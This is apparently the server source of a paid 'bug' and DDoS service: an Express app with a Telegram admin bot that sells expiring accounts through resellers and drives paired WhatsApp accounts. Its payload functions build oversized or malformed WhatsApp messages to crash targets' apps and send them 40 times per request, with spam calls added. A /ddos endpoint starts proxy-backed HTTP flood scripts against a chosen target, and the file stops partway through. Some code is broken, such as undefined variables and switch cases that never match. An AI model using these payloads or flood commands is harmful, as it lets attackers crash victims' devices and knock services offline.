const { Token, owner } = require("./config");
const express = require("express");
const fs = require("fs");
const path = require("path");
const cookieParser = require('cookie-parser');
const cors = require('cors');
const crypto = require('crypto');
const {
const {
    default: makeWASocket,
    makeInMemoryStore,
    useMultiFileAuthState,
    useSingleFileAuthState,
    initInMemoryKeyStore,
    fetchLatestBaileysVersion,
    makeWASocket: WASocket,
    getGroupInviteInfo,
    AuthenticationState,
    BufferJSON,
    downloadContentFromMessage,
    downloadAndSaveMediaMessage,
    generateWAMessage,
    generateMessageID,
    generateWAMessageContent,
    encodeSignedDeviceIdentity,
    generateWAMessageFromContent,
    prepareWAMessageMedia,
    getContentType,
    mentionedJid,
    relayWAMessage,
    templateMessage,
    InteractiveMessage,
    Header,
    MediaType,
    MessageType,
    MessageOptions,
    MessageTypeProto,
    WAMessageContent,
    WAMessage,
    WAMessageProto,
    WALocationMessage,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMediaUpload,
    WAMessageStatus,
    WA_MESSAGE_STATUS_TYPE,
    WA_MESSAGE_STUB_TYPES,
    Presence,
    emitGroupUpdate,
    emitGroupParticipantsUpdate,
    GroupMetadata,
    WAGroupMetadata,
    GroupSettingChange,
    areJidsSameUser,
    ChatModification,
    getStream,
    isBaileys,
    jidDecode,
    processTime,
    ProxyAgent,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    Browsers,
    Browser,
    WAFlag,
    WAContextInfo,
    WANode,
    WAMetric,
    Mimetype,
    MimetypeMap,
    MediaPathMap,
    isJidUser,
    DisconnectReason,
    MediaConnInfo,
    ReconnectMode,
    AnyMessageContent,
    waChatKey,
    WAProto,
    BaileysError,
} = require('@whiskeysockets/baileys');
const pino = require("pino");
const { Telegraf, Markup } = require("telegraf");

const app = express();
const PORT = process.env.PORT || 80;

app.use(express.json());
app.use(express.static('public'));
app.use(cookieParser());
app.use(cors());

app.use(express.static(path.join(__dirname, 'public')));

const file_session = "./sessions.json";
const sessions_dir = "./sessions";
const sessions = new Map();
const bot = new Telegraf(Token);

const resellerPath = './reseller.json';

function loadJSON(path) {
  return fs.existsSync(path) ? JSON.parse(fs.readFileSync(path)) : {};
}

function saveJSON(path, data) {
  fs.writeFileSync(path, JSON.stringify(data, null, 2));
}

function isAuthorized(ctx) {
  const resellerData = loadJSON(resellerPath);
  const userId = ctx.from.id.toString();
  return ctx.isOwner || resellerData[userId];
}

const loadAccounts = () => {
  try {
    const data = fs.readFileSync('./acc.json', 'utf8');
    return JSON.parse(data);
  } catch (error) {
    console.error('Error loading accounts:', error);
    return [];
  }
};

const generateToken = (user) => {
  const payload = {
    username: user.username,
    role: user.role,
    timestamp: Date.now()
  };
  return Buffer.from(JSON.stringify(payload)).toString('base64');
};

const verifyToken = (token) => {
  try {
    const payload = JSON.parse(Buffer.from(token, 'base64').toString());
    const accounts = loadAccounts();
    const user = accounts.find(acc => acc.username === payload.username);
    return user ? payload : null;
  } catch (error) {
    return null;
  }
};

const requireAuth = (req, res, next) => {
  const token = req.headers.authorization?.replace('Bearer ', '');
  const payload = verifyToken(token);

  if (!payload) {
    return res.status(401).json({ success: false, message: 'Unauthorized' });
  }

  req.user = payload;
  next();
};

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'bug.html'));
});

app.get('/ddos-dashboard', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'ddos.html'));
});

const isAccountExpired = (expired) => {
  if (!expired) return false;

  const now = new Date();
  const expiryDate = parseExpiryDate(expired);

  return now > expiryDate;
};

const parseExpiryDate = (expired) => {
  if (!expired) return new Date(Date.now() + 365 * 24 * 60 * 60 * 1000); // 1 year default

  const regex = /^(\d+)([dhmy])$/i;
  const match = expired.match(regex);

  if (!match) return new Date(expired); // Try parsing as regular date

  const value = parseInt(match[1]);
  const unit = match[2].toLowerCase();
  const now = new Date();

  switch (unit) {
    case 'd': return new Date(now.getTime() + value * 24 * 60 * 60 * 1000);
    case 'h': return new Date(now.getTime() + value * 60 * 60 * 1000);
    case 'm': return new Date(now.getTime() + value * 30 * 24 * 60 * 60 * 1000);
    case 'y': return new Date(now.getTime() + value * 365 * 24 * 60 * 60 * 1000);
    default: return new Date(now.getTime() + 24 * 60 * 60 * 1000);
  }
};

const cleanExpiredAccounts = () => {
  const accounts = loadAccounts();
  const validAccounts = accounts.filter(acc => !isAccountExpired(acc.expired));

  if (validAccounts.length !== accounts.length) {
    fs.writeFileSync('./acc.json', JSON.stringify(validAccounts, null, 2));
    console.log(`Removed ${accounts.length - validAccounts.length} expired accounts`);
  }
};

cleanExpiredAccounts();
setInterval(cleanExpiredAccounts, 60 * 60 * 1000);

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const accounts = loadAccounts();

  const user = accounts.find(acc => acc.username === username && acc.password === password);

  if (user) {
    if (isAccountExpired(user.expired)) {
      const updatedAccounts = accounts.filter(acc => acc.username !== username);
      fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));

      return res.status(401).json({
        success: false,
        message: 'Account has expired'
      });
    }

    const validRole = ['ADMIN', 'VIP'].includes(user.role.toUpperCase()) ? user.role.toUpperCase() : 'VIP';

    const token = generateToken(user);
    res.json({
      success: true,
      token,
      user: {
        username: user.username,
        role: validRole,
        expired: user.expired
      }
    });
  } else {
    res.status(401).json({
      success: false,
      message: 'Invalid credentials'
    });
  }
});

const saveActive = (botNumber) => {
  const list = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
  if (!list.includes(botNumber)) {
    list.push(botNumber);
    fs.writeFileSync(file_session, JSON.stringify(list));
  }
};

const sessionPath = (botNumber) => {
  const dir = path.join(sessions_dir, `device${botNumber}`);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });
  return dir;
};

const initializeWhatsAppConnections = async () => {
  if (!fs.existsSync(file_session)) return;
  const activeNumbers = JSON.parse(fs.readFileSync(file_session));
  console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);

  for (const botNumber of activeNumbers) {
    console.log(`Menghubungkan WhatsApp: ${botNumber}`);
    const sessionDir = sessionPath(botNumber);
    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: true,
      logger: pino({ level: "silent" }),
      defaultQueryTimeoutMs: undefined,
    });

    sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
      if (connection === "open") {
        console.log(`Bot ${botNumber} terhubung!`);
        sessions.set(botNumber, sock);
      }
      if (connection === "close") {
        const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
        if (reconnect) {
          console.log(`Koneksi ditutup untuk ${botNumber}, mencoba menghubungkan kembali...`);
          sessions.delete(botNumber);
          await connectToWhatsApp(botNumber, null, null);
        } else {
          console.log(`Sesi ${botNumber} keluar.`);
          sessions.delete(botNumber);
          fs.rmSync(sessionDir, { recursive: true, force: true });
          const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
          const updated = data.filter(n => n !== botNumber);
          fs.writeFileSync(file_session, JSON.stringify(updated));
        }
      }
    });
    sock.ev.on("creds.update", saveCreds);
  }
};

const connectToWhatsApp = async (botNumber, chatId, ctx) => {
  const sessionDir = sessionPath(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  let statusMessage;
  if (ctx) {
    statusMessage = await ctx.reply(`pairing with number *${botNumber}*...`, {
      parse_mode: "Markdown"
    });
  }

  const editStatus = async (text) => {
    if (ctx && chatId && statusMessage) {
      try {
        await ctx.telegram.editMessageText(chatId, statusMessage.message_id, null, text, {
          parse_mode: "Markdown"
        });
      } catch (e) {
        console.error("Gagal edit pesan:", e.message);
      }
    } else {
      console.log(text);
    }
  };

  let paired = false;

  const sock = makeWASocket({
    auth: state,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async ({ connection, lastDisconnect }) => {
    if (connection === "connecting") {
      if (!fs.existsSync(`${sessionDir}/creds.json`)) {
        setTimeout(async () => {
          try {
            const code = await sock.requestPairingCode(botNumber);
            const formatted = code.match(/.{1,4}/g)?.join("-") || code;
            await editStatus(makeCode(botNumber, formatted));
          } catch (err) {
            console.error("Error requesting code:", err);
            await editStatus(makeStatus(botNumber, `❗ ${err.message}`));
          }
        }, 3000);
      }
    }

    if (connection === "open" && !paired) {
      paired = true;
      sessions.set(botNumber, sock);
      saveActive(botNumber);
      await editStatus(makeStatus(botNumber, "✅ Connected successfully."));
    }

    if (connection === "close") {
      const code = lastDisconnect?.error?.output?.statusCode;
      if (code !== DisconnectReason.loggedOut && code >= 500) {
        console.log(`Reconnect diperlukan untuk ${botNumber}`);
        setTimeout(() => connectToWhatsApp(botNumber, chatId, ctx), 2000);
      } else {
        await editStatus(makeStatus(botNumber, "❌ Failed to connect."));
        fs.rmSync(sessionDir, { recursive: true, force: true });
        sessions.delete(botNumber);
        const data = fs.existsSync(file_session) ? JSON.parse(fs.readFileSync(file_session)) : [];
        const updated = data.filter(n => n !== botNumber);
        fs.writeFileSync(file_session, JSON.stringify(updated));
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);
  return sock;
};

const makeStatus = (number, status) =>
  `*Status Pairing*\nNomor: \`${number}\`\nStatus: ${status}`;

const makeCode = (number, code) =>
  `*Kode Pairing*\nNomor: \`${number}\`\nKode: \`${code}\``;

// ====================== BOT TELEGRAM ======================
bot.use(async (ctx, next) => {
  ctx.isOwner = ctx.from?.id?.toString() === owner;
  return next();
});

bot.start((ctx) => {
  ctx.replyWithVideo(
    { url: 'https://files.catbox.moe/tcv2pi.mp4' },
    {
      caption: `
welcome to skid-website, i can only help with this

╭─────────
│ 🔹 /create <username> <password> <role> <expired>
│ 🔹 /listakun
│ 🔹 /delakun <username>
│ 🔹 /pairing <number>
│ 🔹 /listpairing
│ 🔹 /delpairing <number>
│ 🔹 /addreseller <id>
│ 🔹 /delreseller <id>
│ 🔹 /listreseller
╰──────────`,
      parse_mode: 'Markdown',
      ...Markup.inlineKeyboard([
        [Markup.button.url('👤 Owner', 'https://t.me/Dimzxzzx')],
        [Markup.button.url('📢 Join Channel', 'https://t.me/NulllBytee')]
      ])
    }
  );
});

bot.command("create", async (ctx) => {
  if (!isAuthorized(ctx)) return ctx.reply("❌ You don't have access.");

  const args = ctx.message.text.split(" ");
  if (args.length < 4) {
    return ctx.reply(`Use: \`/create <username> <password> <role> <expired>\`

*Valid roles:* ADMIN, VIP
*Expired format:* 1d=1 day, 1h=1 hour, 1m=1 month, 1y=1 year
*Example:* \`/create user123 pass123 VIP 30d\``, { parse_mode: "Markdown" });
  }

  const [, username, password, role, expired] = args;
  const accounts = loadAccounts();

  const validRoles = ['ADMIN', 'VIP'];
  if (!validRoles.includes(role.toUpperCase())) {
    return ctx.reply("❌ Invalid role! Use: ADMIN or VIP");
  }

  if (accounts.find(acc => acc.username === username)) {
    return ctx.reply("❌ Username already exists.");
  }

  if (expired && expired !== "" && !expired.match(/^(\d+)([dhmy])$/i)) {
    return ctx.reply("❌ Invalid expired format! Use: 1d, 1h, 1m, 1y (d=day, h=hour, m=month, y=year)");
  }

  accounts.push({
    username,
    password,
    role: role.toUpperCase(),
    expired: expired || ""
  });

  fs.writeFileSync('./acc.json', JSON.stringify(accounts, null, 2));

  const expiryText = expired ? `Expires in: ${expired}` : "Never expires";

  ctx.reply(`
╭─────────────────────╮
┃✅ Account created successfully!
┃👤 Username: \`${username}\`
┃🔑 Password: \`${password}\`
┃👑 Role: \`${role.toUpperCase()}\`
┃⏰ ${expiryText}
╰─────────────────────╯`, { parse_mode: "Markdown" });
});

bot.command("listakun", (ctx) => {
  if (!isAuthorized(ctx)) return ctx.reply("❌ You don't have access.");

  const accounts = loadAccounts();
  if (accounts.length === 0) {
    return ctx.reply("No accounts found.");
  }

  const list = accounts.map((acc, index) => 
    `${index + 1}. ${acc.username} (${acc.role}) - ${acc.expired || "Never expires"}`
  ).join("\n");

  ctx.reply(`*Account List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delakun", async (ctx) => {
  if (!isAuthorized(ctx)) return ctx.reply("❌ You don't have access.");

  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delakun <username>");

  const username = args[1];
  const accounts = loadAccounts();
  const initialLength = accounts.length;
  const updatedAccounts = accounts.filter(acc => acc.username !== username);

  if (updatedAccounts.length === initialLength) {
    return ctx.reply("❌ Username not found.");
  }

  fs.writeFileSync('./acc.json', JSON.stringify(updatedAccounts, null, 2));
  ctx.reply(`✅ Account ${username} deleted successfully.`);
});

bot.command("pairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: `/pairing <number>`", { parse_mode: "Markdown" });
  const botNumber = args[1];
  await ctx.reply(`⏳ Starting pairing to number ${botNumber}...`);
  await connectToWhatsApp(botNumber, ctx.chat.id, ctx);
});

bot.command("listpairing", (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  if (sessions.size === 0) return ctx.reply("no active sender.");
  const list = [...sessions.keys()].map(n => `• ${n}`).join("\n");
  ctx.reply(`*Active Sender List:*\n${list}`, { parse_mode: "Markdown" });
});

bot.command("delpairing", async (ctx) => {
  if (!ctx.isOwner) return ctx.reply("❌ You don't have access.");
  const args = ctx.message.text.split(" ");
  if (args.length < 2) return ctx.reply("Use: /delpairing 628xxxx");

  const number = args[1];
  if (!sessions.has(number)) return ctx.reply("Sender not found.");

  try {
    const sessionDir = sessionPath(number);
    sessions.get(number).end();
    sessions.delete(number);
    fs.rmSync(sessionDir, { recursive: true, force: true });

    const data = JSON.parse(fs.readFileSync(file_session));
    const updated = data.filter(n => n !== number);
    fs.writeFileSync(file_session, JSON.stringify(updated));

    ctx.reply(`Sender ${number} successfully deleted.`);
  } catch (err) {
    console.error(err);
    ctx.reply("Failed to delete sender.");
  }
});

bot.command('addreseller', (ctx) => {
  if (!ctx.isOwner) return ctx.reply('❌ Owner only.');

  const args = ctx.message.text.split(' ').slice(1);
  const targetId = args[0];
  if (!targetId) return ctx.reply('⚠️ Use: /addreseller <id>');

  const data = loadJSON(resellerPath);
  data[targetId] = true;
  saveJSON(resellerPath, data);

  ctx.reply(`✅ ID \`${targetId}\` become a reseller.`, { parse_mode: 'Markdown' });
});

bot.command('delreseller', (ctx) => {
  if (!ctx.isOwner) return ctx.reply('❌ Owner only.');

  const args = ctx.message.text.split(' ').slice(1);
  const targetId = args[0];
  if (!targetId) return ctx.reply('⚠️ Use: /delreseller <id>');

  const data = loadJSON(resellerPath);
  if (!data[targetId]) return ctx.reply('❌ ID is not a reseller.');

  delete data[targetId];
  saveJSON(resellerPath, data);

  ctx.reply(`✅ ID \`${targetId}\` removed from reseller.`, { parse_mode: 'Markdown' });
});

bot.command('listreseller', (ctx) => {
  if (!ctx.isOwner) return ctx.reply('❌ only owner.');

  const data = loadJSON(resellerPath);
  const ids = Object.keys(data);

  if (ids.length === 0) return ctx.reply('📭 There are no resellers yet.');

  const list = ids.map((id, i) => `${i + 1}. \`${id}\``).join('\n');
  ctx.reply(`📋 Reseller List:\n${list}`, { parse_mode: 'Markdown' });
});


// ====================== FUNCTION BUG ======================
async function iosInVis(skid, jid){
const s = "𑇂𑆵𑆴𑆿".repeat(60000);
   try {
      let locationMessage = {
         degreesLatitude: 11.11,
         degreesLongitude: -11.11,
         name: " ‼️⃟𝕾⃰‌𝖓𝒊𝖙‌‌‌‌‌‌𝖍‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
         url: "https://t.me/Snitchezs",
      }
      let msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
            message: {
               locationMessage
            }
         }
      }, {});
      let extendMsg = {
         extendedTextMessage: { 
            text: "‼️⃟𝕾⃰‌𝖓𝒊𝖙‌‌‌‌‌‌𝖍‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + s,
            matchedText: "𝔖𝔫𝔦𝔱𝔥",
            description: "𑇂𑆵𑆴𑆿".repeat(60000),
            title: "‼️⃟𝕾⃰‌𝖓𝒊𝖙‌‌‌‌‌‌𝖍‌ ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            previewType: "NONE",
            jpegThumbnail: "",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      }
      let msg2 = generateWAMessageFromContent(jid, {
         viewOnceMessage: {
            message: {
               extendMsg
            }
         }
      }, {});
      await skid.relayMessage('status@broadcast', msg.message, {
         messageId: msg.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
      await skid.relayMessage('status@broadcast', msg2.message, {
         messageId: msg2.key.id,
         statusJidList: [jid],
         additionalNodes: [{
            tag: 'meta',
            attrs: {},
            content: [{
               tag: 'mentioned_users',
               attrs: {},
               content: [{
                  tag: 'to',
                  attrs: {
                     jid: jid
                  },
                  content: undefined
               }]
            }]
         }]
      });
   } catch (err) {
      console.error(err);
   }
};

async function bulldozer2GB(skid, jid) {
  let parse = true;
  let SID = "5e03e0";
  let key = "10000000_2203140470115547_947412155165083119_n.enc";
  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true`,
          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
          mimetype: type,
          directPath: `/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}`,
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 1000 * 40,
                },
                () =>
                  "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(jid, message, {});

  await skid.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [jid],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: jid },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
}

async function FcBeta(skid, jid) {
  let message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: {
            text: "@NullByte",
          },
          contextInfo: {
            participant: "0@s.whatsapp.net",
            remoteJid: "status@broadcast",
            mentionedJid: ["0@s.whatsapp.net", "132222223@s.whatsapp.net"],
          },
          nativeFlowMessage: {
          messageParamsJson: "{[".repeat(10000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: "ꦽ".repeat(10000),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
               {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({ status: true, }),
              },
                {
                name: "camera_permission_request",
                buttonParamsJson: JSON.stringify({ "cameraAccess": true, }),
              },
            ],
            messageParamsJson: "{[".repeat(10000),
          }, 
        },
      },
    },
  };

  const [janda1, janda2] = await Promise.all([
    await skid.relayMessage(jid, message, {
      messageId: "",
      participant: target,
      userJid: jid
    }),
    await skid.relayMessage(jid, message, {
      messageId: "",
      participant: jid,
      userJid: jid
    })
  ]);

  await Promise.all([
    await skid.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda1 } }),
    await skid.sendMessage(target, { delete: { fromMe: true, remoteJid: target, id: janda2 } })
  ]);
}

async function CallUi(skid, jid) {
  const msg = await generateWAMessageFromContent(
    jid,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: isTarget,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [jid],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "@NullByte" + "ꦾ".repeat(50000)
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson:
                     ""
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson:
                     ""
                }
              ]
            }
          }
        }
      }
    },
    {}
  );

  await skid.relayMessage(jid, msg.message, {
    participant: jid,
    messageId: msg.key.id
  });
}

async function crashNewIos(skid, jid) {

await skid.relayMessage(jid, {
  contactsArrayMessage: {
    displayName: "@NullByte" + "𑇂𑆵𑆴𑆿".repeat(60000),
    contacts: [
      {
        displayName: "@NullByte",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;@NullByte;;;\nFN: @NullByte\nitem1.TEL;waid=5521986470032:+55 21 98647-0032\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      },
      {
        displayName: "@NullByte",
        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;@NullByte;;;\nFN: @NullByte\nitem1.TEL;waid=5512988103218:+55 12 98810-3218\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
      }
    ],
    contextInfo: {
      forwardingScore: 1,
      isForwarded: true,
      quotedAd: {
        advertiserName: "x",
        mediaType: "IMAGE",
        jpegThumbnail: null,
        caption: "x"
        },
      placeholderKey: {
        remoteJid: "0@s.whatsapp.net",
        fromMe: false,
        id: "ABCDEF1234567890"
        }        
      }
    }
  }, { participant: jid  })
}      

async function fccil(skid, jid) {
    console.log(chalk.green("[ ! ] > Send force close to target"));

    await dim.relayMessage(jid, {
        viewOnceMessage: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "@NullByte",
                        format: "DEFAULT"
                    },
                    nativeFlowResponseMessage: {
                        name: "payment_transaction_request",
                         buttonParamsJson: "~".repeat(10000),
                        version: 3
                    }
                },
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true,
                    fromMe: false,
                    mentionedJid: [jid],
                    remoteJid: "status@broadcast"
                }
            }
        }
    }, { participant: jid });

    console.log(chalk.green("[ ! ] > Sent"));
}

async function SpamCall(skid, jid) {
    await skid.offerCall(jid);
  console.log(`Angkat aca`) 
}

function toValidJid(nomor) {
  nomor = nomor.replace(/\D/g, '');

  if (nomor.length < 8 || nomor.length > 15) return null;

  return `${nomor}@s.whatsapp.net`;
}

app.get("/attack/metode", requireAuth, async (req, res) => {
  try {
    const metode = req.query.metode;
    const target = req.query.target;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!metode || !target) {
      return res.status(400).json({
        status: false,
        message: "'method' and 'target' parameters are required"
      });
    }

    const jid = toValidJid(target);
    if (!jid) {
      return res.status(400).json({
        status: false,
        message: "Nomor tidak valid"
      });
    }

    let decoded;
    try {
      decoded = jidDecode(jid);
    } catch (e) {
      return res.status(400).json({
        status: false,
        message: "JID decode gagal"
      });
    }

    if (typeof decoded !== 'object' || !decoded?.user || !isJidUser(jid)) {
      return res.status(400).json({
        status: false,
        message: "Invalid JID target (not a user JID or decode failed"
      });
    }

    if (sessions.size === 0) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const notifPesan = `
╭─────────────────
│New request bug
│From User: ${req.user.username} (${req.user.role})
│From IP: ${ipClient}
│Time: ${waktu}
│Method: ${metode}
│Target: ${target}
╰─────────────────
Bot By: @communityxp
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    const botNumber = [...sessions.keys()][0];
    if (!botNumber) {
      return res.status(400).json({
        status: false,
        message: "no active sender"
      });
    }

    const skid = sessions.get(botNumber);
    if (!skid) {
      return res.status(400).json({
        status: false,
        message: "Socket not found for active bot number"
      });
    }

    const send = async (fn) => {
      for (let i = 0; i < 40; i++) {
        await fn(skid, jid);
      }
    };

    switch (metode.toLowerCase()) {
      case "FORECLOSE":
        await send(FcBeta);
        await send(CallUi);
        await send(fccil);
        break;
      case "BLANK":
        await send(crash);
        break;
      case "IOS":
        await send(iosInVis);
        await send(crashNewIos);
        await send(fccil);
        break;
      case "DELAY":
        await send(bulldozer2GB);
        break;
      case "CALL":
        await send(SpamCall);
        break;
      case "combo":
        await send(FcBeta);
        await send(CallUi);
        await send(fccil);
        await send(iosInVis);
        await send(crashNewIos);
        break;
      default:
        return res.status(400).json({
          status: false,
          message: "metode tidak dikenali. Available: foreclose, forcecall, blank, crash, ios, delay, native, combo"
        });
    }

    return res.json({
      status: "200",
      creator: "@xpxteams",
      result: "sukses",
      target: jid.split("@")[0],
      metode: metode.toLowerCase(),
      user: req.user.username
    });

  } catch (err) {
    console.error("Gagal kirim:", err);
    return res.status(500).json({
      status: false,
      message: "Fitur Sedang Ada Perbaikan"
    });
  }
});

app.get("/ddos", requireAuth, async (req, res) => {
  try {
    const { key, metode, target, time, proxyUrl, threads, rate } = req.query;
    const ipClient = req.ip || req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const waktu = new Date().toLocaleString();

    if (!key || !metode || !target || !time) {
      return res.status(400).json({ 
        status: false, 
        message: "Required parameters: key, metode, target, time" 
      });
    }

    if (key !== "NullByte") {
      return res.status(403).json({ 
        status: false, 
        message: "Incorrect API key" 
      });
    }

    const validMethods = ["BYPASS", "CIBI", "FLOOD", "GLORY", "HTTP-X", "HTTPS", "HTTPX", "RAW", "TLS", "UAM", "CF", "H2", "CF-BYPASS"];
    if (!validMethods.includes(metode)) {
      return res.status(400).json({ 
        status: false, 
        message: `Method '${metode}' is not recognized. Valid methods: ${validMethods.join(', ')}` 
      });
    }

    const duration = parseInt(time);
    if (isNaN(duration) || duration < 1 || duration > 500) {
      return res.status(400).json({ 
        status: false, 
        message: "Time must be 1 - 500 seconds" 
      });
    }

    const threadCount = parseInt(threads) || 100;
    const rateCount = parseInt(rate) || 1000000;

    let proxyStatus = "Using existing proxies";
    if (proxyUrl && proxyUrl.trim()) {
      try {
        const proxyResp = await axios.get(proxyUrl);
        const proxyFile = path.join(__dirname, "proxy.txt");
        fs.writeFileSync(proxyFile, proxyResp.data);
        proxyStatus = `Proxy fetched from URL: ${proxyUrl}`;
      } catch (err) {
        console.error("Failed to fetch proxy list:", err.message);
        return res.status(500).json({
          status: false,
          message: "Failed to fetch proxy list from given URL"
        });
      }
    }

    const notifPesan = `
╭─────────────────
│ New DDOS request
│ From User: ${req.user.username} (${req.user.role})
│ From IP: ${ipClient}
│ Time: ${waktu}
│ Method: ${metode}
│ Target: ${target}
│ Duration: ${duration}s
│ Threads: ${threadCount}
│ Rate: ${rateCount}
│ Proxy: ${proxyStatus}
╰─────────────────
Bot By: @communityxp
    `;
    await bot.telegram.sendMessage(owner, notifPesan);

    let command;
    if (metode === "BYPASS") {
      command = `node BYPASS.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "CIBI") {
      command = `node CIBI.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "FLOOD") {
      command = `node FLOOD.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "GLORY") {
      command = `node GLORY.js ${target} ${duration} ${threadCount} ${rateCount} proxy.txt`;
    } else if (metode === "HTTPS") {
